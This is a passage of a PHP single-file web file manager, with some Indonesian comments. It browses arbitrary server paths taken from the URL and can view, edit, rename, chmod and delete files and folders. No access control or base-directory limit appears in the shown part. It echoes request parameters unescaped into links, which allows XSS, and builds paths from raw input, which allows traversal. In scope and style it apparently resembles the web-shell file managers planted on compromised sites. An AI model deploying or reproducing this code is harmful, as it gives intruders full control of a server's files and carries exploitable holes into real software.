                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center cursor-pointer transition-all duration-300 hover:scale-105" type="submit" name="newfolder">
                        Create Folder
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["newfolder"])) {
                $folderName = trim($_POST["folder_name"]);
                $folderPath = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $folderName;

                if ($folderName !== "" && !file_exists($folderPath)) {
                    if (mkdir($folderPath, 0777, true)) {
                        $_SESSION["success"] = "Folder created successfully!";
                        header("Refresh:0; url=?path=" . urlencode($path));
                        exit;
                    } else {
                        $_SESSION["error"] = "Failed to create folder.";
                        header("Refresh:0; url=?path=" . urlencode($path));
                        exit;
                    }
                } else {
                    $_SESSION["error"] = "Folder already exists or invalid name.";
                    header("Refresh:0; url=?path=" . urlencode($path));
                    exit;
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "view" && isset($_GET["file"])) {
            $filePath = rtrim($_GET["path"], "/\\") . DIRECTORY_SEPARATOR . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath)) {
            ?>
                <div class='mt-4 bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6'>
                    <h2 class='text-lg font-semibold mb-4 text-gray-900 dark:text-white'>File Content: <code class="bg-gray-100 dark:bg-gray-700 px-2 py-1 rounded"><?= htmlspecialchars($_GET["file"]); ?></code></h2>
                    <textarea rows="12" class='block p-4 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:text-white focus:outline-none font-mono transition-all duration-300' readonly><?= htmlspecialchars(file_get_contents($filePath)); ?></textarea>
                </div>
                <div class="flex gap-x-3 mt-4 justify-center">
                    <a class="px-4 py-2 bg-blue-500 hover:bg-blue-600 text-white rounded-lg transition-colors flex items-center space-x-2" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=edit">
                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M13.586 3.586a2 2 0 112.828 2.828l-.793.793-2.828-2.828.793-.793zM11.379 5.793L3 14.172V17h2.828l8.38-8.379-2.83-2.828z"/></svg>
                        <span>Edit</span>
                    </a>
                    <a class="px-4 py-2 bg-yellow-500 hover:bg-yellow-600 text-white rounded-lg transition-colors flex items-center space-x-2" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=renamefile">
                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M13.586 3.586a2 2 0 112.828 2.828l-.793.793-2.828-2.828.793-.793zM11.379 5.793L3 14.172V17h2.828l8.38-8.379-2.83-2.828z"/></svg>
                        <span>Rename</span>
                    </a>
                    <a class="px-4 py-2 bg-green-500 hover:bg-green-600 text-white rounded-lg transition-colors flex items-center space-x-2" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=chmodfile">
                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M11.49 3.17c-.38-1.56-2.6-1.56-2.98 0a1.532 1.532 0 01-2.286.948c-1.372-.836-2.942.734-2.106 2.106.54.886.061 2.042-.947 2.287-1.561.379-1.561 2.6 0 2.978a1.532 1.532 0 01.947 2.287c-.836 1.372.734 2.942 2.106 2.106a1.532 1.532 0 012.287.947c.379 1.561 2.6 1.561 2.978 0a1.533 1.533 0 012.287-.947c1.372.836 2.942-.734 2.106-2.106a1.533 1.533 0 01.947-2.287c1.561-.379 1.561-2.6 0-2.978a1.532 1.532 0 01-.947-2.287c.836-1.372-.734-2.942-2.106-2.106a1.532 1.532 0 01-2.287-.947zM10 13a3 3 0 100-6 3 3 0 000 6z" clip-rule="evenodd"/></svg>
                        <span>Chmod</span>
                    </a>
                    <a class="px-4 py-2 bg-red-500 hover:bg-red-600 text-white rounded-lg transition-colors flex items-center space-x-2" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=deletefile">
                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M9 2a1 1 0 00-.894.553L7.382 4H4a1 1 0 000 2v10a2 2 0 002 2h8a2 2 0 002-2V6a1 1 0 100-2h-3.382l-.724-1.447A1 1 0 0011 2H9zM7 8a1 1 0 012 0v6a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v6a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd"/></svg>
                        <span>Delete</span>
                    </a>
                </div>
            <?php
            } else {
            ?>
                <div class='mt-4 text-red-600 bg-red-50 dark:bg-red-900/20 p-4 rounded-xl'>File does not exist or is not readable.</div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "edit" && isset($_GET["file"])) {
            $filePath = rtrim($_GET["path"], "/\\") . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath)) {
                $content = htmlspecialchars(file_get_contents($filePath));
            ?>
                <form method="post" action="">
                    <div class='mt-4 bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6'>
                        <label for="file_content" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">File Content: <code class="bg-gray-100 dark:bg-gray-700 px-2 py-1 rounded"><?= htmlspecialchars($_GET["file"]); ?></code></label>
                        <textarea id="file_content" name="file_content" rows="12" class="block p-4 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 transition-all duration-300 font-mono"><?= $content; ?></textarea>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center cursor-pointer transition-all duration-300 hover:scale-105" type="submit" name="edit">
                            Save Changes
                        </button>
                    </div>
                </form>
            <?php
            } else {
                echo "<div class='mt-4 text-red-600 bg-red-50 dark:bg-red-900/20 p-4 rounded-xl'>File does not exist or is not readable.</div>";
            }

            if (isset($_POST["edit"])) {
                $content = $_POST["file_content"];
                if (doFile($filePath, $content)) {
                    $_SESSION["success"] = "File updated successfully!";
                    header("Refresh:0; url=?path=" . urlencode($_GET["path"]) . "&file=" . urlencode($_GET["file"]) . "&action=edit");
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to update file.";
                    header("Refresh:0; url=?path=" . urlencode($_GET["path"]) . "&file=" . urlencode($_GET["file"]) . "&action=edit");
                    exit;
                }
            }
        }

        // --- Rename Logic (file or folder) ---
        function handleRename($type, $currentNameKey)
        {
            $isFile = ($type === 'file');
            $nameKey = $isFile ? 'file' : 'folder';

            if (!isset($_GET["path"], $_GET[$nameKey])) {
                echo "<div class='mt-4 text-red-600'>Invalid parameters.</div>";
                return;
            }

            $currentName = $_GET[$nameKey];
            $path = rtrim($_GET["path"], "/\\");
            $fullPath = $path . DIRECTORY_SEPARATOR . $currentName;

            $isValid = $isFile ? (file_exists($fullPath) && is_file($fullPath)) : (is_dir($fullPath) && is_writable($fullPath));
            if (!$isValid) {
                echo "<div class='mt-4 text-red-600'>" . ucfirst($type) . " does not exist or is not readable.</div>";
                return;
            }

            // Handle POST Rename
            if (isset($_POST["rename"])) {
                $newName = trim($_POST["new_name"]);
                $newPath = $path . DIRECTORY_SEPARATOR . $newName;

                if ($newName !== "" && rename($fullPath, $newPath)) {
                    $_SESSION["success"] = ucfirst($type) . " renamed successfully!";
                    header("Location: ?path=" . urlencode($path) . "&" . $nameKey . "=" . urlencode($newName) . "&action=rename" . $type);
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to rename " . $type . ".";
                    header("Location: ?path=" . urlencode($path) . "&" . $nameKey . "=" . urlencode($currentName) . "&action=rename" . $type);
                    exit;
                }
            }

            // Show form
            ?>
            <form method="post" action="">
                <div class='mt-4 bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6'>
                    <label for="new_name" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">
                        New <?= ucfirst($type) ?> Name:
                    </label>
                    <input type="text" id="new_name" name="new_name" value="<?= htmlspecialchars($currentName); ?>"
                        class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 transition-all duration-300"
                        required>
                    <button
                        class="block mt-3 w-full max-w-sm mx-auto text-white bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center cursor-pointer transition-all duration-300 hover:scale-105"
                        type="submit" name="rename">
                        Rename
                    </button>
                </div>
            </form>
            <?php
        }

        // --- Route Rename Requests ---
        if (isset($_GET["action"])) {
            if ($_GET["action"] === "renamefile") {
                handleRename("file", "file");
            } elseif ($_GET["action"] === "renamefolder") {
                handleRename("folder", "folder");
            }
        }


        if (isset($_GET["action"]) && $_GET["action"] === "deletefile" && isset($_GET["file"])) {
            $filePath = rtrim($_GET["path"], "/\\") . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath)) {
            ?>
                <div class='mt-4 bg-red-50 dark:bg-red-900/20 rounded-xl shadow-lg p-6 text-center'>
                    <div class="w-16 h-16 bg-red-100 dark:bg-red-900 rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-8 h-8 text-red-600 dark:text-red-400" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M9 2a1 1 0 00-.894.553L7.382 4H4a1 1 0 000 2v10a2 2 0 002 2h8a2 2 0 002-2V6a1 1 0 100-2h-3.382l-.724-1.447A1 1 0 0011 2H9zM7 8a1 1 0 012 0v6a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v6a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd"/>
                        </svg>
                    </div>
                    <p class="text-lg font-semibold text-gray-900 dark:text-white mb-2">Delete Confirmation</p>
                    <p class="text-gray-600 dark:text-gray-300 mb-6">Are you sure you want to delete the file <code class="bg-gray-200 dark:bg-gray-700 px-2 py-1 rounded"><?= htmlspecialchars($_GET["file"]); ?></code>?</p>
                    <form method="post" action="">
                        <div class="flex justify-center space-x-4">
                            <a href="?path=<?= urlencode($_GET['path']); ?>" class="px-6 py-2 bg-gray-500 hover:bg-gray-600 text-white rounded-lg transition-colors">
                                Cancel
                            </a>
                            <button class="px-6 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors" type="submit" name="delete">
                                Delete
                            </button>
                        </div>
                    </form>
                </div>
            <?php
            } else {
                echo "<div class='mt-4 text-red-600 bg-red-50 dark:bg-red-900/20 p-4 rounded-xl'>File does not exist or is not readable.</div>";
            }

            if (isset($_POST["delete"])) {
                if (unlink($filePath)) {
                    $_SESSION["success"] = "File deleted successfully!";
                    header("Refresh:0; url=?path=" . urlencode($_GET["path"]));
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to delete file.";
                    header("Refresh:0; url=?path=" . urlencode($_GET["path"]) . "&file=" . urlencode($_GET["file"]) . "&action=deletefile");
                    exit;
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "deletefolder" && isset($_GET["path"]) && isset($_GET["file"])) {
            $basePath = rtrim($_GET["path"], "/\\");
            $folderName = $_GET["file"];
            $folderPath = $basePath . "/" . $folderName;

            if (file_exists($folderPath) && is_dir($folderPath)) {
            ?>
                <!-- Tampilkan konfirmasi -->
                <div class='mt-4 bg-red-50 dark:bg-red-900/20 rounded-xl shadow-lg p-6 text-center'>
                    <div class="w-16 h-16 bg-red-100 dark:bg-red-900 rounded-full flex items-center justify-center mx-auto mb-4">
                        <svg class="w-8 h-8 text-red-600 dark:text-red-400" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M9 2a1 1 0 00-.894.553L7.382 4H4a1 1 0 000 2v10a2 2 0 002 2h8a2 2 0 002-2V6a1 1 0 100-2h-3.382l-.724-1.447A1 1 0 0011 2H9zM7 8a1 1 0 012 0v6a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v6a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd"/>
                        </svg>
                    </div>
                    <p class="text-lg font-semibold text-gray-900 dark:text-white mb-2">Delete Confirmation</p>
                    <p class="text-gray-600 dark:text-gray-300 mb-6">Are you sure you want to delete the folder <code class="bg-gray-200 dark:bg-gray-700 px-2 py-1 rounded"><?= htmlspecialchars($folderName); ?></code> and all its contents?</p>
                    <form method="post">
                        <div class="flex justify-center space-x-4">
                            <a href="?path=<?= urlencode($basePath); ?>" class="px-6 py-2 bg-gray-500 hover:bg-gray-600 text-white rounded-lg transition-colors">
                                Cancel
                            </a>
                            <button class="px-6 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors" type="submit" name="delete_folder">
                                Yes, Delete Folder
                            </button>
                        </div>
                    </form>
                </div>
                <?php

                // Hapus setelah konfirmasi
                if (isset($_POST["delete_folder"])) {
                    if (removeFolder($folderPath)) {
                        $_SESSION["success"] = "Folder and its contents deleted successfully.";
                    } else {
                        $_SESSION["error"] = "Failed to delete folder.";
                    }

                    // Redirect untuk menghindari submit ulang
                    header("Location: ?path=" . urlencode($basePath));
                    exit;
                }
            } else {
                echo "<div class='mt-4 text-red-600 bg-red-50 dark:bg-red-900/20 p-4 rounded-xl'>Folder does not exist.</div>";
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "chmodfile" && isset($_GET["file"])) {
            $filePath = rtrim($_GET["path"], "/\\") . "/" . $_GET["file"];
            if (file_exists($filePath) || is_writable($filePath)) {
                ?>
                <form method="post" action="">
                    <div class='mt-4 bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6'>
                        <label for="new_permission" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">
                            File: <code class="bg-gray-100 dark:bg-gray-700 px-2 py-1 rounded"><?= htmlspecialchars($_GET["file"]); ?></code>
                        </label>
                        <input type="text" id="new_permission" name="new_permission" value="<?= substr(sprintf('%o', @fileperms($filePath)), -4); ?>"
                            class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 transition-all duration-300"
                            required>
                        <button
                            class="block mt-3 w-full max-w-sm mx-auto text-white bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center cursor-pointer transition-all duration-300 hover:scale-105"
                            type="submit" name="chmodfile">
                            Change Permissions
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["chmodfile"])) {
                    $newPermission = $_POST["new_permission"];
                    chmodItem($filePath, $newPermission);
                }
            } else {
                echo "<div class='mt-4 text-red-600 bg-red-50 dark:bg-red-900/20 p-4 rounded-xl'>File does not exist or is not writable.</div>";
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "chmodfolder" && isset($_GET["folder"])) {
            $folderPath = rtrim($_GET["path"], "/\\") . "/" . $_GET["folder"];
            if (is_dir($folderPath) || is_writable($folderPath)) {
                ?>
                <form method="post" action="">
                    <div class='mt-4 bg-white dark:bg-gray-800 rounded-xl shadow-lg p-6'>
                        <label for="new_permission" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">
                            Folder: <code class="bg-gray-100 dark:bg-gray-700 px-2 py-1 rounded"><?= htmlspecialchars($_GET["folder"]); ?></code>
                        </label>
                        <input type="text" id="new_permission" name="new_permission" value="<?= substr(sprintf('%o', @fileperms($folderPath)), -4); ?>"
                            class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 transition-all duration-300"
                            required>
                        <button
                            class="block mt-3 w-full max-w-sm mx-auto text-white bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center cursor-pointer transition-all duration-300 hover:scale-105"
                            type="submit" name="chmodfolder">
                            Change Permissions
                        </button>
                    </div>
                </form>
        <?php
                if (isset($_POST["chmodfolder"])) {
                    $newPermission = $_POST["new_permission"];
                    chmodItem($folderPath, $newPermission);
                }
            } else {
                echo "<div class='mt-4 text-red-600 bg-red-50 dark:bg-red-900/20 p-4 rounded-xl'>Folder does not exist or is not writable.</div>";
            }
        }
        ?>

        <!-- TABLE DISPLAY -->
        <div class="flex mt-8 mb-4">
            <a class="flex gap-x-2 items-center text-white bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 px-6 py-3 rounded-tl-lg rounded-tr-lg font-medium transition-all duration-300 hover:scale-105" href="?path=<?= $path; ?>&action=newfile">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m5 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
                </svg>
                <span>NEW FILE</span>
            </a>
            <a class="flex gap-x-2 items-center text-white bg-gradient-to-r from-green-500 to-teal-600 hover:from-green-600 hover:to-teal-700 px-6 py-3 font-medium transition-all duration-300 hover:scale-105" href="?path=<?= $path; ?>&action=newfolder">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9 1V7a2 2 0 012-2h6l2 2h6a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2z"/>
                </svg>
                <span>NEW FOLDER</span>
            </a>
        </div>
        <div class="relative overflow-x-auto shadow-xl rounded-lg mb-8">
            <table class="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
                <thead class="text-xs text-gray-700 uppercase bg-gradient-to-r from-gray-100 to-gray-200 dark:from-gray-800 dark:to-gray-700 dark:text-gray-400">
                    <tr>
                        <th class="px-6 py-4">Name</th>
                        <th class="px-6 py-4">Size</th>
                        <th class="px-6 py-4">Permission</th>
                        <th class="px-6 py-4">Action</th>
                    </tr>
                </thead>
                <?php if (is_readable($path)): ?>
                    <tbody>
                        <?php
                        $files = scandir($path);
                        foreach ($files as $file) {
                            if ($file === '.' || $file === '..' || is_file($path . DIRECTORY_SEPARATOR . $file)) continue;

                            $filePath = $path . DIRECTORY_SEPARATOR . $file;
                            $filePerms = substr(sprintf('%o', @fileperms($filePath)), -4);
                        ?>
                            <tr class='bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-600 transition-colors'>
                                <td class='px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white'>
                                    <a class="flex items-center gap-x-2 hover:text-blue-600 dark:hover:text-blue-400 transition-colors" href="?path=<?= urlencode($path . DIRECTORY_SEPARATOR . $file); ?>">
                                        <div class="w-10 h-10 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-lg flex items-center justify-center">
                                            <svg class="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
                                                <path fill-rule="evenodd" d="M3 6a2 2 0 0 1 2-2h5.532a2 2 0 0 1 1.536.72l1.9 2.28H3V6Zm0 3v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9H3Z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div>
                                            <span class="font-semibold"><?= $file; ?></span>
                                            <p class="text-xs text-gray-500 dark:text-gray-400">Folder</p>
                                        </div>
                                    </a>
                                </td>
                                <td class='px-6 py-4 text-gray-600 dark:text-gray-400'>---</td>
                                <td class='px-6 py-4 font-mono <?php if (is_writable($filePath)): ?> text-green-600 dark:text-green-400 <?php else: ?> text-gray-600 dark:text-gray-400 <?php endif; ?>'>
                                    <?= $filePerms; ?>
                                </td>
                                <td class='px-6 py-4'>
                                    <div class="flex gap-x-2">
                                        <!-- Folder Rename Action -->
                                        <a href="?path=<?= $path ?>&folder=<?= urlencode($file); ?>&action=renamefolder" 
                                           class='w-10 h-10 bg-blue-100 dark:bg-blue-900/30 hover:bg-blue-200 dark:hover:bg-blue-800 rounded-lg flex items-center justify-center transition-colors group'
                                           title="Rename">
                                            <svg class="w-5 h-5 text-blue-600 dark:text-blue-400 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28" />
                                            </svg>
                                        </a>
                                        <!-- Folder Chmod Action -->
                                        <a href="?path=<?= $path ?>&folder=<?= urlencode($file); ?>&action=chmodfolder" 
                                           class='w-10 h-10 bg-green-100 dark:bg-green-900/30 hover:bg-green-200 dark:hover:bg-green-800 rounded-lg flex items-center justify-center transition-colors group'
                                           title="Change Permissions">
                                            <svg class="w-5 h-5 text-green-600 dark:text-green-400 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 8v8m0-8h8M8 8H6a2 2 0 1 1 2-2v2Zm0 8h8m-8 0H6a2 2 0 1 0 2 2v-2Zm8 0V8m0 8h2a2 2 0 1 1-2 2v-2Zm0-8h2a2 2 0 1 0-2-2v2Z" />
                                            </svg>
                                        </a>
                                        <!-- Folder Delete Action -->
                                        <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=deletefolder" 
                                           class='w-10 h-10 bg-red-100 dark:bg-red-900/30 hover:bg-red-200 dark:hover:bg-red-800 rounded-lg flex items-center justify-center transition-colors group'
                                           title="Delete">
                                            <svg class="w-5 h-5 text-red-600 dark:text-red-400 group-hover:scale-110 transition-transform" fill="currentColor" viewBox="0 0 24 24">
                                                <path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd" />
                                            </svg>
                                        </a>
                                    </div>
                                </td>
                            </tr>
                        <?php } ?>
                    </tbody>

                    <tbody>
                        <?php
                        foreach ($files as $file) {
                            if ($file === '.' || $file === '..' || is_dir($path . DIRECTORY_SEPARATOR . $file)) continue;

                            $filePath = $path . DIRECTORY_SEPARATOR . $file;
                            $fileSize = @filesize($filePath);
                            $filePerms = substr(sprintf('%o', @fileperms($filePath)), -4);
                            $fileExt = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                            
                            // Icon berdasarkan ekstensi
                            $iconColor = 'blue';
                            if (in_array($fileExt, ['jpg', 'jpeg', 'png', 'gif', 'svg'])) {
                                $iconColor = 'pink';
                            } elseif (in_array($fileExt, ['php', 'html', 'js', 'css'])) {
                                $iconColor = 'yellow';
                            } elseif (in_array($fileExt, ['pdf', 'doc', 'docx'])) {
                                $iconColor = 'red';
                            } elseif (in_array($fileExt, ['zip', 'rar', 'tar', 'gz'])) {
                                $iconColor = 'green';
                            }
                        ?>
                            <tr class='bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-600 transition-colors'>
                                <td class='px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white'>
                                    <a class="flex items-center gap-x-2 hover:text-blue-600 dark:hover:text-blue-400 transition-colors" href="?path=<?= urlencode($path); ?>&file=<?= urlencode($file); ?>&action=view">
                                        <div class="w-10 h-10 bg-gradient-to-r from-blue-400 to-blue-600 rounded-lg flex items-center justify-center">
                                            <svg class="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
                                                <path fill-rule="evenodd" d="M9 2.221V7H4.221a2 2 0 0 1 .365-.5L8.5 2.586A2 2 0 0 1 9 2.22ZM11 2v5a2 2 0 0 1-2 2H4v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2h-7Z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="truncate max-w-xs">
                                            <span class="font-semibold truncate"><?= $file; ?></span>
                                            <p class="text-xs text-gray-500 dark:text-gray-400 truncate"><?= strtoupper($fileExt) ?: 'FILE' ?></p>
                                        </div>
                                    </a>
                                </td>
                                <td class='px-6 py-4 text-gray-600 dark:text-gray-400'>
                                    <?php
                                    if ($fileSize >= 1048576) {
                                        echo number_format($fileSize / 1048576, 2) . ' MB';
                                    } elseif ($fileSize >= 1024) {
                                        echo number_format($fileSize / 1024, 2) . ' KB';
                                    } else {
                                        echo $fileSize . ' bytes';
                                    }
                                    ?>
                                </td>
                                <td class='px-6 py-4 font-mono <?php if (is_writable($filePath)): ?> text-green-600 dark:text-green-400 <?php else: ?> text-gray-600 dark:text-gray-400 <?php endif; ?>'>
                                    <?= $filePerms; ?>
                                </td>
                                <td class='px-6 py-4'>
                                    <div class="flex gap-x-2">
                                        <!-- File Edit Action -->
                                        <a href="?path=<?= $path; ?>&file=<?= urlencode($file); ?>&action=edit" 
                                           class='w-10 h-10 bg-blue-100 dark:bg-blue-900/30 hover:bg-blue-200 dark:hover:bg-blue-800 rounded-lg flex items-center justify-center transition-colors group'
                                           title="Edit">
                                            <svg class="w-5 h-5 text-blue-600 dark:text-blue-400 group-hover:scale-110 transition-transform" fill="currentColor" viewBox="0 0 24 24">
                                                <path fill-rule="evenodd" d="M11.32 6.176H5c-1.105 0-2 .949-2 2.118v10.588C3 20.052 3.895 21 5 21h11c1.105 0 2-.948 2-2.118v-7.75l-3.914 4.144A2.46 2.46 0 0 1 12.81 16l-2.681.568c-1.75.37-3.292-1.263-2.942-3.115l.536-2.839c.097-.512.335-.983.684-1.352l2.914-3.086Z" clip-rule="evenodd" />
                                                <path fill-rule="evenodd" d="M19.846 4.318a2.148 2.148 0 0 0-.437-.692 2.014 2.014 0 0 0-.654-.463 1.92 1.92 0 0 0-1.544 0 2.014 2.014 0 0 0-.654.463l-.546.578 2.852 3.02.546-.579a2.14 2.14 0 0 0 .437-.692 2.244 2.244 0 0 0 0-1.635ZM17.45 8.721 14.597 5.7 9.82 10.76a.54.54 0 0 0-.137.27l-.536 2.84c-.07.37.239.696.588.622l2.682-.567a.492.492 0 0 0 .255-.145l4.778-5.06Z" clip-rule="evenodd" />
                                            </svg>
                                        </a>
                                        <!-- File Rename Action -->
                                        <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=renamefile" 
                                           class='w-10 h-10 bg-yellow-100 dark:bg-yellow-900/30 hover:bg-yellow-200 dark:hover:bg-yellow-800 rounded-lg flex items-center justify-center transition-colors group'
                                           title="Rename">
                                            <svg class="w-5 h-5 text-yellow-600 dark:text-yellow-400 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28" />
                                            </svg>
                                        </a>
                                        <!-- File Chmod Action -->
                                        <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=chmodfile" 
                                           class='w-10 h-10 bg-green-100 dark:bg-green-900/30 hover:bg-green-200 dark:hover:bg-green-800 rounded-lg flex items-center justify-center transition-colors group'
                                           title="Change Permissions">
                                            <svg class="w-5 h-5 text-green-600 dark:text-green-400 group-hover:scale-110 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 8v8m0-8h8M8 8H6a2 2 0 1 1 2-2v2Zm0 8h8m-8 0H6a2 2 0 1 0 2 2v-2Zm8 0V8m0 8h2a2 2 0 1 1-2 2v-2Zm0-8h2a2 2 0 1 0-2-2v2Z" />
                                            </svg>
                                        </a>
                                        <!-- File Delete Action -->
                                        <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=deletefile" 
                                           class='w-10 h-10 bg-red-100 dark:bg-red-900/30 hover:bg-red-200 dark:hover:bg-red-800 rounded-lg flex items-center justify-center transition-colors group'
                                           title="Delete">
                                            <svg class="w-5 h-5 text-red-600 dark:text-red-400 group-hover:scale-110 transition-transform" fill="currentColor" viewBox="0 0 24 24">
